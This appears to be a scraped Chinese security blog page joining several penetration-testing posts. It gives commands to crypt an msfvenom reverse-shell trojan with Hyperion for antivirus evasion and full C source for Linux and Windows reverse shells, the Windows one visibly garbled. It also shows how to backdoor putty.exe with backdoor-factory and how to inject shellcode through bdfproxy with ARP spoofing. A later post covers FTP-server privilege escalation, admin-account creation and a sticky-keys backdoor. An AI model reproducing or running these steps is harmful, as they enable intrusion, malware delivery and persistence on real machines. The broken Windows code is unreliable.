<p><img src="https://img-blog.csdnimg.cn/20190413174128295.png" alt="在这里插入图片描述"></p>
</li>
</ul>
<h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul>
<li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li>
<li>常被恶意软件用于免杀目的</li>
<li>Hyperion （32bit PE 程序加密器）</li>
<li>Crypter / Container（解密器 PE Loader ）</li>
</ul>
<pre><code>  root@kali:~# git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip
  root@kali:~# unzip Hyperion-1.2.zip
  root@kali:~# dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32

  # 生成加密器
  root@kali:~# cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe

  # 生成木马程序
  root@kali:~# msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe

  # 对木马程序进行加密
  root@kali:~# wine h.exe p.exe x.exe</code></pre><ul>
<li><p>比较编码前后的检测率</p>
<ul>
<li>未经过编码的 p.exe 检测率是 45%</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413174133640.png" alt="在这里插入图片描述"></p>
</li>
<li><p>未经过编码的 x.exe 检测率是 37%</p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413174137778.png" alt="在这里插入图片描述"></p>
<h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul>
<li>Windows reverse shell</li>
</ul>
<pre><code>  root@kali:~# wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><ul>
<li>Linux shellg’c’c</li>
</ul>
<pre><code>  root@kali:~# gcc linux_revers_shell.c -o linux

  # 测试程序
  root@kali:~# nc -nvlp 333
  root@kali:~# ./linux 127.0.0.1 333</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413174142304.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20190413174147316.png" alt="在这里插入图片描述"></p>
<ul>
<li>linux_revers_shell.c</li>
</ul>
<pre><code>  #include &lt;stdio.h&gt;
  #include &lt;sys/socket.h&gt;
  #include &lt;arpa/inet.h&gt;
  #include &lt;stdlib.h&gt;
  #include &lt;string.h&gt;
  #include &lt;unistd.h&gt;
  #include &lt;netinet/in.h&gt;

  int main(int argc, char *argv[])
  {
      struct sockaddr_in sock;
      int s;
      if (argc != 3)
      {
          fprintf(stderr, &quot;uso: 192.168.153.166 4444\n&quot;); exit(1);
      }
      sock.sin_family  = AF_INET;
      sock.sin_port = htons(atoi(argv[2]));
      sock.sin_addr.s_addr = inet_addr(argv[1]);
      s = socket(AF_INET, SOCK_STREAM, 0);

      connect(s,(struct sockaddr_in *)&amp;sock, sizeof(struct sockaddr_in));

      dup2(s,0);
      dup2(s,1);
      dup2(s,2);
      execl(&quot;/bin/sh&quot;,&quot;httpd&quot;,(char *)0); //precess httpd
  }</code></pre><ul>
<li>windows.c</li>
</ul>
<pre><code>  # 未修正错误
  #include &lt;winsock2.h&gt;
  #include &lt;stdio.h&gt;

  #pragma comment(lib,&quot;ws2_32&quot;)

      WSADATA wsaData;
      SOCKET Winsock;
      SOOKET Sock;
      struct sockaddr_in hax;
      char ip_addr[16];
      STARTUPINFO ini_processo;
      PROCESS_INFORMATION processo_info;

  int main(int argc,char *argv[])
      WSAStartup(MAKEWORD(2,2), wsaData);
      winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

      if (argc != 3)
      {fprintf(stderr,&quot;Uso: &lt;rhost&gt; &lt;rport&gt;\n&quot;;) exit(1);}
      struct hostent *host;
      host = gethostbyname(argv [1] );
      strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));

      hax.sin_family = AF_INET;
      hax.sin_port = htons(atoi(argv[2]));
      hax.sin_addr.s_addr = inet_addr(ip_addr);

      WSAConnect(Winsock,(SOCKADDR* &amp;hax,sizeof(hax),NULL,NULL,NULL,NULL;
      memset(&amp;ini_processo,0,sizeof(ini_processo));
      ini_processo.cb = sizeof(ini_processo);
      ini_processo.dwFlags = START_USESTDHANDLES;
      ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
      CreateProcess(NULL,&quot;cmd exe&quot;,NULL,NULL,TRUE,0,NULL,NULL,&amp;ini_processo,&amp;process_info);</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413174154985.png" alt="在这里插入图片描述"></p>
<h4 id="后门工具–Backdoor-factory"><a href="#后门工具–Backdoor-factory" class="headerlink" title="后门工具–Backdoor-factory"></a>后门工具–Backdoor-factory</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>patch<ul>
<li>通过替换 exe、dll、注册表等方法修复系统漏洞或问题的方法</li>
<li>bdf：向二进制文件中增加或者删除代码内容<ul>
<li>某些受保护的二进制程序无法 patch</li>
<li>存在一定概率问价你会被 patch 坏掉</li>
</ul>
</li>
</ul>
</li>
<li>后门工厂<ul>
<li>使用于 windows PE x32/64 和 linux ELF x32/64 （OSX）</li>
<li>支持 msf payload、自定义 payload</li>
</ul>
</li>
<li>将 shellcode 代码 patch 进模板文件，躲避 AV 检查</li>
<li>python 语言编写</li>
<li>msf 使用的 patch 方法<ul>
<li>覆盖程序入口<ul>
<li>msfvenom -p windows/shell/reverse_tcp</li>
</ul>
</li>
<li>创建新的线程执行 shellcode 并跳回原程序入口<ul>
<li>msfvenom -p windows/shell/reverse_tcp –k</li>
<li>增加代码片段跳转执行后跳回源程序入口</li>
</ul>
</li>
</ul>
</li>
<li>CTP 方法<ul>
<li>增加新的代码段 session，与 smf 的-k 方法类似</li>
<li>使用现有的代码裂缝/洞（code cave）存放 shellcode</li>
</ul>
</li>
<li>代码洞<ul>
<li>二进制中超过两个字节的连续 x00 区域（代码片段间区域）</li>
<li>根据统计判断代码洞是编译在进行编译是造成的，不同的编译器造成的代码洞的大小不同</li>
</ul>
</li>
<li>单个代码洞代销不足以存放完整的 shellcode<ul>
<li>多代码洞跳转（非顺序执行）<ul>
<li>初期免杀率可达100%</li>
</ul>
</li>
<li>结合 msf 的 stager 方法</li>
</ul>
</li>
<li>patch 选项<ul>
<li>附加代码段</li>
<li>单代码洞注入</li>
<li>多代码注入</li>
</ul>
</li>
<li>BDF 基本使用<ul>
<li>检查二进制文件是否支持代码注入<ul>
<li>backdoor-factory -f putty.exe –S</li>
</ul>
</li>
<li>显示可用 payload<ul>
<li>backdoor-factory -f putty.exe -s show</li>
<li>backdoor-factory -f <code>which nc</code> -s show</li>
<li>backdoor-factory -f putty.exe -s show iat_reverse_tcp_stager_threaded -H 10.10.10.133 -P 4444</li>
<li>默认单一代码洞，选项 .rdata –&gt; 查看文件 –&gt; 查病毒</li>
<li>使用 msf 侦听 set payload windows/meterpreter/revers_tcp set LHOST 10.10.10.131 set LPORT 4444 run</li>
</ul>
</li>
<li>查看 cave 大小<ul>
<li>ackdoor-factory -f putty.exe -c -l</li>
</ul>
</li>
</ul>
</li>
<li>免杀效果对比<ul>
<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</li>
<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</li>
<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.20.8 -P 6666 -a</li>
</ul>
</li>
<li>与 veil-evasion 集成</li>
<li>Linux：backdoor-factory -f putty.exe -s show</li>
<li>IAT：import address table</li>
<li>指针指向 WinAPI 地址，被称为 thunks （形实转换程序），地址预定义</li>
</ul>
<h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><ul>
<li><p>-S：检查二进制文件是否支持代码注入</p>
<pre><code>  root@kali:~# backdoor-factory -f putty.exe –S</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190525145311915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>-c: 在确定其支持patch 后，我们再来查看其是否支持我们指定的 shellcode patch</li>
</ul>
<pre><code>  -c：code cave(代码裂缝)
  -l：代码裂缝大小
  root@kali:~# backdoor-factory -f putty.exe -c -l 200</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145320244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p>
<pre><code>  root@kali:~# backdoor-factory -f putty.exe -s show</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/201905251453287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>  root@kali:~# backdoor-factory -f `which nc` -s show</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145334950.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>注入 putty.exe，报错</p>
<pre><code>  root@kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190525145341279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>  [!] Enter your selection: 2</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145347873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>显示未找到文件</p>
<pre><code>  Failed to read certificate file: /usr/share/backdoor-factory/certs/Verisign.cer
  139701503748160:error:02001002:system library:fopen:No such file or directory:bss_file.c:175:fopen(&#39;/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem&#39;,&#39;rb&#39;)
  139701503748160:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:182:
  139701503748160:error:02001002:system library:fopen:No such file or directory:bss_file.c:175:fopen(&#39;/usr/share/backdoor-factory/certs/Verisign.cer&#39;,&#39;rb&#39;)
  139701503748160:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:182:
  Failed
  File putty5.exe is in the &#39;backdoored&#39; directory</code></pre></li>
<li><p>修复错误（备份并重命名）</p>
<pre><code>  root@kali:~# cat /usr/share/backdoor-factory/certs/
  passFile.txt           signingCert.cer        signingPrivateKey.pem  
  root@kali:~# cd /usr/share/backdoor-factory/certs/

  root@kali:/usr/share/backdoor-factory/certs# cp signingCert.cer signingCert.cer.bak
  root@kali:/usr/share/backdoor-factory/certs# mv signingCert.cer Verisign.cer
  root@kali:/usr/share/backdoor-factory/certs# cp signingPrivateKey.pem signingPrivateKey.pem.bak
  root@kali:/usr/share/backdoor-factory/certs# mv signingPrivateKey.pem VerisignPrivateKey.pem

  root@kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190525145357145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>使用 msf 侦听</p>
<pre><code>  msf &gt; use exploit/multi/handler
  msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
  msf exploit(multi/handler) &gt; set LHOST 10.10.10.131
  msf exploit(multi/handler) &gt; set LPORT 4444
  msf exploit(multi/handler) &gt; run</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190525145405583.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>windows 运行被注入 putty2.exe 程序，kali 反弹成功</p>
</li>
<li><p>免杀效果比较</p>
<p><a href="http://www.virscan.org/scan/" target="_blank" rel="noopener">查病毒网站：http://www.virscan.org/scan/</a></p>
</li>
</ul>
<pre><code>  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty3.exe
  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty4.exe –J
  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty5.exe -a</code></pre><ul>
<li><p>与 veil-evasion 集成</p>
<pre><code>  root@kali:~# veil-evasion
  [menu&gt;&gt;]: list</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190525145414174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>Bdfproxy（mitmproxy）<ul>
<li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS spoof、Fake AP）</li>
</ul>
</li>
<li>步骤<ul>
<li>sysctl -w net.ipv4.ip_forward=1</li>
<li>iptables -t nat -A PREROUTING -p tcp –dport 80/443 -j REDIRECT –to-ports 8080</li>
<li>vi /etc/bdfproxy/bdfproxy.cfg<ul>
<li>proxyMode = transparent<br>修改侦听 IP 地址bdfproxy</li>
</ul>
</li>
</ul>
</li>
<li>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</li>
<li>启动 msf</li>
<li>流程<ul>
<li>mana 创建 Fack AP</li>
<li>badfproxy 代理注入代码</li>
<li>msf 侦听反弹 shell</li>
</ul>
</li>
</ul>
<h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><ul>
<li><p>修改 IP 转发</p>
<pre><code>root@kali:~# vim /etc/sysctl.conf 
net.ipv4.ip_forward=1</code></pre></li>
<li><p>修改 iptables</p>
<pre><code>root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</code></pre></li>
<li><p>修改配置文件</p>
<pre><code>root@kali:~# vim /etc/bdfproxy/bdfproxy.cfg
proxyMode = transparent  
HOST = 10.10.10.131     #108行，117行，128行，替换所有的，有6个</code></pre></li>
<li><p>启动 bdfproxy</p>
<pre><code>root@kali:~# bdfproxy</code></pre></li>
<li><p>启动 msfconsole</p>
<pre><code>root@kali:~# msfconsole -r /root/bdfproxy_msf_resource.rc
msf exploit(multi/handler) &gt; jobs</code></pre></li>
</ul>
<ul>
<li><p>arp 欺骗</p>
<pre><code>root@kali:~# arpspoof -i eth0 -t 10.10.10.133 10.10.10.2</code></pre></li>
<li><p>靶机访问浏览器下载软件，并运行</p>
<pre><code>![](https://i.imgur.com/1qLFgFZ.png)</code></pre></li>
</ul>
<h4 id="3-无线流量劫持"><a href="#3-无线流量劫持" class="headerlink" title="3.无线流量劫持"></a>3.无线流量劫持</h4><ul>
<li><p>vi /etc/mana-toolkit/hostapd-mana.conf</p>
<ul>
<li>修改无线 SSID 名称</li>
</ul>
</li>
<li><p>./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</p>
<ul>
<li>修改 wlan1 无线网卡适配器并启动</li>
<li>iptables -t nat -A PREROUTING -i $phy -p tcp –dport 80/443 -j REDIRECT –to-port 8080</li>
</ul>
</li>
<li><p>vi /etc/bdfproxy/bdfproxy.cfg</p>
<ul>
<li>proxyMode = transparent</li>
<li>修改侦听 IP 地址并启动 badfproxy</li>
</ul>
</li>
<li><p>启动 msf</p>
<ul>
<li>msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</li>
</ul>
</li>
<li><p>补充内容</p>
<ul>
<li>全站 HTTPS 防注入（微软每个补丁都带码）</li>
<li>PE 文件证书签名可被清除</li>
<li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<ul>
<li>全部用 0 覆盖</li>
<li>BDF 默认清除数字签名</li>
</ul>
</li>
</ul>
</li>
<li><p><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></p>
<ul>
<li>这是允许访问所有Sysinternals公用程序的文件共享。我们已经开发了这个功能来测试我们实用程序的替代分配机制。</li>
<li>这将允许您从任何连接到互联网的计算机运行这些工具，而无需导航到网页，下载并解压zip文件。</li>
</ul>
</li>
<li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/" target="_blank" rel="noopener">Sysinternals网站</a></p>
<ul>
<li>Sysinternals网站由Mark Russinovich于1996年创建，主办他先进的系统实用程序和技术信息。无论您是IT专业人员还是开发人员，您都可以找到Sysinternals实用程序来帮助您管理，诊断和诊断Windows系统和应用程序。</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/" itemprop="url">msf后渗透部分学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-28T12:36:04+08:00">
                2020-04-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/" itemprop="url">windows中常见提权方式总结(三)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-28T09:56:53+08:00">
                2020-04-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul>
<li>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</li>
<li>serv-u默认安装目录:C:\Program Files\rhinosoft.com\serv-U</li>
<li>serv-u密码文件：ServUDaemon.ini</li>
<li>端口号：默认端口是43958<br>ServUDaemon.ini中lccalsetuportNo=端口</li>
</ul>
<h5 id="FTP提权方法"><a href="#FTP提权方法" class="headerlink" title="FTP提权方法"></a>FTP提权方法</h5><p>1、有修改权限</p>
<p>2、无权限修改</p>
<p>3、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p>
<p>4、serv-u ftp转发端口</p>
<h5 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h5><p>步骤如下：<br>1、判断是否安装serv-u<br>nmap扫端口确认<br>2、检查是否有可写权限<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini<br>3、在serv-u中添加用户<br>在user4=添加一个系统用户</p>
<pre><code>[USER=quan|1]                                //用户名
Password=                        //用户密码加密后的密文
HomeDir=c:\ftp\quan             //目录
RelPaths=3 
TimeOut=600                      //超时时间设置
Maintenance=System               //权限
Access1=C:\|RWAMELCDP            //可访问的目录及权限
Access2=d:\|RWAMELCDP            //可访问的目录及权限
Access3=e:\|RWAMELCDP            //可访问的目录及权限
SKEYValues=</code></pre><p>password=2位随机字符+md5(2位随机字符+123456)</p>
<p>4、连接目标FTP服务器</p>
<pre><code>ftp 目标IP地址 刚添加的用户密码</code></pre><p>5、利用ftp命令<code>quote site exec</code>添加用户加入administrators权限组</p>
<pre><code>quote site exec net user quan quan123 /add
quote site exec net localgroup administrators quan /add</code></pre><h5 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h5><p>1、利用md5 直接去解密<br>2、默认用户名密码<br>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P<br>命令：<br>cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add<br>3、不是默认密码时<br>直接把SerUAdmin.exe 下载下来<br>用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码</p>
<h5 id="serv-u-ftp本地溢出权限提升-使用6-0以及以前版本"><a href="#serv-u-ftp本地溢出权限提升-使用6-0以及以前版本" class="headerlink" title="serv-u ftp本地溢出权限提升(使用6.0以及以前版本)"></a>serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</h5><p>步骤如下：<br>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下<br>比如是d盘<br>3、执行命令</p>
<pre><code>d:\serv_u.exe
d:\serv_u.exe “net user quan quan123 /add”
d:\serv_u.exe “net localgroup administrators quan /add” </code></pre><p>注意命令要有引号</p>
<h5 id="serv-u-ftp转发端口"><a href="#serv-u-ftp转发端口" class="headerlink" title="serv-u ftp转发端口"></a>serv-u ftp转发端口</h5><p>1、lcx端口转发<br>在目标Webshell上运行LCX命令</p>
<pre><code>lcx -slave yourIP 5000 127.0.0.1 43958</code></pre><p>在本机上运行</p>
<pre><code>lcx -listen 5000 21</code></pre><p>2、本机登陆Serv_U<br>打开本地的SERV_U 在IP上填入127.0.0.1<br>帐号写LocalAdministrator 密码#l@$ak#.lk;0@P</p>
<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a></p>
<p>这里就不写具体过程了</p>
<h4 id="第三方软件G6-FTP提权"><a href="#第三方软件G6-FTP提权" class="headerlink" title="第三方软件G6-FTP提权"></a>第三方软件G6-FTP提权</h4><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%89%5CQQ%E6%88%AA%E5%9B%BE20200429095652.png" alt=""></p>
<h5 id="G6-FTP简介"><a href="#G6-FTP简介" class="headerlink" title="G6-FTP简介"></a>G6-FTP简介</h5><ul>
<li>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</li>
<li>G6-FTP的默认端口为<code>8021</code>，只侦听在127.0.0.1的8021端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</li>
</ul>
<h5 id="提权关键"><a href="#提权关键" class="headerlink" title="提权关键"></a>提权关键</h5><p>使用lcx时必须保证两个前提，肉鸡A和内网机C都能够访问到外网机B；listen监听的端口之前不能被其它程序占用。</p>
<h5 id="提取方法"><a href="#提取方法" class="headerlink" title="提取方法"></a>提取方法</h5><p>1、通过执行bat文件提权<br>2、通过映射bat文件提权</p>
<h5 id="通过执行bat文件提权"><a href="#通过执行bat文件提权" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>步骤如下</p>
<ul>
<li><p>下载配置文件<code>Remote.ini</code>，将<code>administrator</code>管理密码解密<br>用cmd5 破解</p>
</li>
<li><p>查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p>
</li>
<li><p>利用<code>lcx</code>端口转发 默认只允许本机连接</p>
</li>
</ul>
<pre><code>lcx.exe -tran 8027 127.0.0.1 8021</code></pre><ul>
<li><p>以管理员用户登录服务端<br>转发成功后，通过<code>G6-FTP</code>软件进行连接，以管理员用户登入</p>
</li>
<li><p>创建FTP用户并进行权限设置</p>
</li>
<li><p>上传批处理文件<br><code>adduser.bat</code>中的文件内容为：即新建一个用户名为<code>quan</code>的用户，并且加入到管理员组中。</p>
</li>
</ul>
<pre><code>net user quan quan123 /add
net localgroup administrators quan /add</code></pre><ul>
<li><p>在G6-FTP软件中加入批处理命令<br>site commands-&gt; +<br>Command:ADDUSER<br>Excute:</p>
</li>
<li><p>普通用户登录ftp</p>
</li>
<li><p>执行所加入的批处理命令<br>执行命令<code>quote site adduser.bat</code></p>
</li>
</ul>
<h5 id="通过执行bat文件提权-1"><a href="#通过执行bat文件提权-1" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>可用性较差<br>步骤如下<br>1、以非特权用户登录<br>2、通过添加FTP用户账户hhh<br>3、对FTP服务器添加新的site命令<br>4、新建a.bat文件</p>
<pre><code>net user quan quan123 /add
net localgroup administrators quan /add</code></pre><p>5、将a.bat文件映射到新建的site命令</p>
<p>6、获取system权限<br>以test用户登录ftp服务器，执行以下命令<br>ftp&gt;quote site a</p>
<h4 id="第三方软件FileZilla提权"><a href="#第三方软件FileZilla提权" class="headerlink" title="第三方软件FileZilla提权"></a>第三方软件FileZilla提权</h4><h5 id="FileZilla简介"><a href="#FileZilla简介" class="headerlink" title="FileZilla简介"></a>FileZilla简介</h5><ul>
<li>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。</li>
<li>FileZilla的默认端口为<code>14147</code>，只侦听在127.0.0.1的14147端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。默认安装目录下有两个敏感文件<code>filezillaserver.xml</code>（包含用户信息）和<code>filezillaserverinterface.xml</code>（包含管理信息）</li>
</ul>
<h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>1、下载这两个文件，拿到管理密码</p>
<p>2、查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p>
<p>3、利用<code>lcx</code>端口转发 默认只允许本机连接</p>
<pre><code>lcx.exe -tran 14148 127.0.0.1 14147</code></pre><p>4、以管理员用户远程登录服务端程序<br>转发成功后，通过<code>FileZilla</code>软件进行连接，以管理员用户登入<br>端口为14148，密码默认为空</p>
<p>5、创建ftp用户并进行权限设置<br>赋予C盘读写权限</p>
<p>6、用刚创建的用户通过FileZilla的客户端登录ftp</p>
<p>7、使用<code>cmd.exe</code>改名为<code>sethc.exe</code>替换<code>C:\Windows\System32\sethc.exe</code>生成shift后门</p>
<p>8、远程登录<code>3389</code>,按<code>5</code>次shift调出<code>cmd.exe</code></p>
<p>9、添加一个用户，并将其提升为管理员权限</p>
<pre><code>net user quan 123 /add
